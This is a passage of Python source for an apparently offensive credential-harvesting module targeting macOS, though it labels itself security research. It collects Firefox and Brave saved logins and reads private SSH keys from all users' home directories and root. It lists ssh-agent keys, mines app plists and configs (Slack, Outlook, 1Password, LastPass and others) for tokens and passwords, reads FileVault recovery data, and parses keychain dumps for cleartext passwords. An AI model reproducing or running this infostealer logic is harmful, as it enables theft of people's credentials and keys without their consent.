            firefox_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")

            if os.path.exists(firefox_path):
                for profile in os.listdir(firefox_path):
                    profile_path = os.path.join(firefox_path, profile)
                    if os.path.isdir(profile_path):
                        logins_file = os.path.join(profile_path, "logins.json")
                        if os.path.exists(logins_file):
                            try:
                                with open(logins_file, encoding="utf-8") as f:
                                    logins_data = json.load(f)

                                for login in logins_data.get("logins", []):
                                    credentials["browser_passwords"].append(
                                        {
                                            "browser": "firefox",
                                            "profile": profile,
                                            "hostname": login.get("hostname", ""),
                                            "username": login.get("encryptedUsername", ""),
                                            "password": login.get("encryptedPassword", ""),
                                            "source": "firefox_profile",
                                            "note": "Encrypted with master password",
                                        }
                                    )
                            except Exception as e:
                                self.logger.debug("Error reading Firefox logins: %s", e)

            # Brave on macOS
            brave_path = os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data")

            if os.path.exists(brave_path):
                brave_creds = self._extract_browser_credentials(brave_path, "brave")
                if brave_creds:
                    credentials["browser_passwords"].extend(brave_creds)

        except Exception as e:
            self.logger.error("Error extracting macOS browser passwords: %s", e)

        return credentials

    def _macos_ssh_keys(self) -> dict[str, Any]:
        """Extract SSH keys from macOS."""
        credentials = {"ssh_keys": []}

        try:
            ssh_paths = [
                os.path.expanduser("~/.ssh/"),
                "/var/root/.ssh/",
                "/Users/*/.ssh/",
            ]

            for ssh_path in ssh_paths:
                if "*" in ssh_path:
                    import glob

                    matching_paths = glob.glob(ssh_path)
                    paths_to_check = matching_paths
                else:
                    paths_to_check = [ssh_path] if os.path.exists(ssh_path) else []

                for path in paths_to_check:
                    if os.path.isdir(path):
                        for filename in os.listdir(path):
                            file_path = os.path.join(path, filename)

                            # Check for private keys
                            if not filename.endswith(".pub") and os.path.isfile(file_path):
                                try:
                                    with open(file_path, "r") as f:
                                        content = f.read()

                                    if "PRIVATE KEY" in content:
                                        key_type = "unknown"
                                        if "RSA" in content:
                                            key_type = "rsa"
                                        elif "DSA" in content:
                                            key_type = "dsa"
                                        elif "EC" in content:
                                            key_type = "ecdsa"
                                        elif "OPENSSH" in content:
                                            key_type = "ed25519"

                                        credentials["ssh_keys"].append(
                                            {
                                                "path": file_path,
                                                "filename": filename,
                                                "key_type": key_type,
                                                "owner": os.path.basename(os.path.dirname(path)),
                                                "permissions": oct(os.stat(file_path).st_mode)[-3:],
                                                "size": os.path.getsize(file_path),
                                                "source": "ssh_directory",
                                            }
                                        )

                                        # Check for corresponding public key
                                        pub_path = f"{file_path}.pub"
                                        if os.path.exists(pub_path):
                                            with open(pub_path, "r") as f:
                                                pub_content = f.read().strip()

                                            credentials["ssh_keys"][-1]["public_key"] = (
                                                pub_content[:100] + "..." if len(pub_content) > 100 else pub_content
                                            )

                                except Exception as e:
                                    self.logger.debug("Error reading SSH key %s: %s", file_path, e)

            # Check SSH agent for loaded keys
            try:
                ssh_add_path = shutil.which("ssh-add")
                if ssh_add_path:
                    ssh_add_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [ssh_add_path, "-l"],
                        check=False,
                        capture_output=True,
                        text=True,
                        timeout=5,
                        shell=False,  # Explicitly secure - using list format prevents shell injection
                    )

                    if ssh_add_result.returncode == 0:
                        loaded_keys = []
                        for line in ssh_add_result.stdout.strip().split("\n"):
                            if line:
                                parts = line.split()
                                if len(parts) >= 3:
                                    loaded_keys.append(
                                        {"bits": parts[0], "fingerprint": parts[1], "comment": " ".join(parts[2:]), "source": "ssh_agent"}
                                    )

                        if loaded_keys:
                            credentials["ssh_keys"].append({"type": "ssh_agent_keys", "loaded_keys": loaded_keys, "source": "ssh_agent"})

            except Exception as e:
                self.logger.debug("Error checking SSH agent: %s", e)

        except Exception as e:
            self.logger.error("Error extracting macOS SSH keys: %s", e)

        return credentials

    def _macos_application_passwords(self) -> dict[str, Any]:
        """Extract application-specific passwords from macOS."""
        credentials = {"application_passwords": []}

        try:
            # Common application preference locations
            app_pref_paths = [
                "~/Library/Preferences/",
                "~/Library/Application Support/",
                "~/Library/Containers/",
            ]

            # Applications known to store credentials
            target_apps = [
                "com.apple.mail",
                "com.microsoft.Outlook",
                "com.tinyspeck.slackmacgap",
                "com.spotify.client",
                "com.dropbox.Dropbox",
                "com.getdropbox.dropbox",
                "com.agilebits.onepassword",
                "com.lastpass.LastPass",
                "com.github.GitHubClient",
                "com.microsoft.teams",
                "com.apple.iChat",
                "com.skype.skype",
            ]

            for pref_path in app_pref_paths:
                expanded_path = os.path.expanduser(pref_path)

                if os.path.exists(expanded_path):
                    for app_id in target_apps:
                        # Check for plist files
                        plist_path = os.path.join(expanded_path, f"{app_id}.plist")

                        if os.path.exists(plist_path):
                            try:
                                # Use plutil to convert plist to JSON
                                plutil_cmd = ["plutil", "-convert", "json", "-o", "-", plist_path]
                                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                    plutil_cmd,
                                    check=False,
                                    capture_output=True,
                                    text=True,
                                    timeout=5,
                                    shell=False,  # Explicitly secure - using list format prevents shell injection
                                )

                                if result.returncode == 0:
                                    plist_data = json.loads(result.stdout)

                                    # Extract potential credentials
                                    app_creds = self._extract_credentials_from_plist(plist_data, app_id)

                                    if app_creds:
                                        credentials["application_passwords"].append(
                                            {"application": app_id, "credentials": app_creds, "source": plist_path, "type": "plist"}
                                        )

                            except Exception as e:
                                self.logger.debug("Error reading plist %s: %s", plist_path, e)

                        # Check for application support directories
                        app_support_path = os.path.join(expanded_path, app_id.split(".")[-1])

                        if os.path.exists(app_support_path) and os.path.isdir(app_support_path):
                            # Search for config files
                            for root, _dirs, files in os.walk(app_support_path):
                                for file in files:
                                    if any(ext in file.lower() for ext in [".conf", ".cfg", ".ini", ".json", ".db"]):
                                        file_path = os.path.join(root, file)

                                        try:
                                            # Extract credentials from config files
                                            file_creds = self._extract_credentials_from_file(file_path)

                                            if file_creds:
                                                credentials["application_passwords"].append(
                                                    {
                                                        "application": app_id,
                                                        "config_file": file_path,
                                                        "credentials": file_creds,
                                                        "source": "app_support",
                                                        "type": "config",
                                                    }
                                                )

                                        except Exception as e:
                                            self.logger.debug("Error reading app config %s: %s", file_path, e)

            # FileVault recovery key (if accessible)
            filevault_plist = "/Library/Preferences/com.apple.fderecoveryagent.plist"

            if os.path.exists(filevault_plist) and os.access(filevault_plist, os.R_OK):
                try:
                    plutil_cmd = ["plutil", "-convert", "json", "-o", "-", filevault_plist]
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        plutil_cmd,
                        check=False,
                        capture_output=True,
                        text=True,
                        timeout=5,
                        shell=False,  # Explicitly secure - using list format prevents shell injection
                    )

                    if result.returncode == 0:
                        filevault_data = json.loads(result.stdout)

                        credentials["application_passwords"].append(
                            {
                                "type": "filevault",
                                "data": filevault_data,
                                "source": filevault_plist,
                                "note": "FileVault recovery information",
                            }
                        )

                except Exception as e:
                    self.logger.debug("Error reading FileVault plist: %s", e)

        except Exception as e:
            self.logger.error("Error extracting macOS application passwords: %s", e)

        return credentials

    # macOS helper methods

    def _parse_keychain_dump(self, dump_text: str) -> list[dict[str, Any]]:
        """Parse macOS keychain dump output."""
        items = []
        current_item = {}

        for line in dump_text.split("\n"):
            line = line.strip()

            if line.startswith("keychain:"):
                if current_item:
                    items.append(current_item)
                current_item = {}
            elif ":" in line:
                # Parse key-value pairs
                key, value = line.split(":", 1)
                key = key.strip().replace(" ", "_").lower()
                value = value.strip().strip('"')

                if key and value:
                    current_item[key] = value

        if current_item:
            items.append(current_item)

        return items

    def _extract_keychain_password_info(self, text: str) -> dict[str, Any] | None:
        """Extract password information from keychain output."""
        info = {}

        for line in text.split("\n"):
            if "password:" in line.lower():
                # Extract password (usually after 'password:')
                parts = line.split(":", 1)
                if len(parts) > 1:
                    password = parts[1].strip().strip('"')
                    if password and password != "(null)":  # noqa: S105
                        info["password"] = password
            elif "account:" in line.lower():
                parts = line.split(":", 1)
                if len(parts) > 1:
                    info["account"] = parts[1].strip().strip('"')
            elif "server:" in line.lower():
                parts = line.split(":", 1)
                if len(parts) > 1:
                    info["server"] = parts[1].strip().strip('"')
            elif "service:" in line.lower():
                parts = line.split(":", 1)
                if len(parts) > 1:
                    info["service"] = parts[1].strip().strip('"')

        return info if info else None

    def _parse_safari_keychain(self, text: str) -> list[dict[str, Any]]:
        """Parse Safari keychain entries."""
        credentials = []
        current_entry = {}

        for line in text.split("\n"):
            line = line.strip()

            if line.startswith("keychain:") and current_entry:
                credentials.append(current_entry)
                current_entry = {}
            elif "server:" in line.lower():
                current_entry["url"] = line.split(":", 1)[1].strip().strip('"')
            elif "account:" in line.lower():
                current_entry["username"] = line.split(":", 1)[1].strip().strip('"')
            elif "password:" in line.lower():
                password = line.split(":", 1)[1].strip().strip('"')
                if password != "(null)":  # noqa: S105
                    current_entry["password"] = password
                    current_entry["browser"] = "safari"
                    current_entry["source"] = "keychain"

        if current_entry:
            credentials.append(current_entry)

        return credentials

    def _extract_credentials_from_plist(self, plist_data: dict, app_id: str) -> list[dict[str, Any]]:
        """Extract credentials from plist data."""
        credentials = []

        def search_dict(d, path=""):
            for key, value in d.items():
                current_path = f"{path}.{key}" if path else key

                # Check for credential-related keys
                if any(keyword in key.lower() for keyword in ["password", "token", "secret", "key", "credential"]):
                    if isinstance(value, str) and value and len(value) > 3:
                        credentials.append(
                            {"key": current_path, "value": value[:50] + "..." if len(value) > 50 else value, "type": "plist_credential"}
                        )
                elif isinstance(value, dict):
                    search_dict(value, current_path)
                elif isinstance(value, list):
                    for i, item in enumerate(value):
                        if isinstance(item, dict):
                            search_dict(item, f"{current_path}[{i}]")

        search_dict(plist_data)
        return credentials
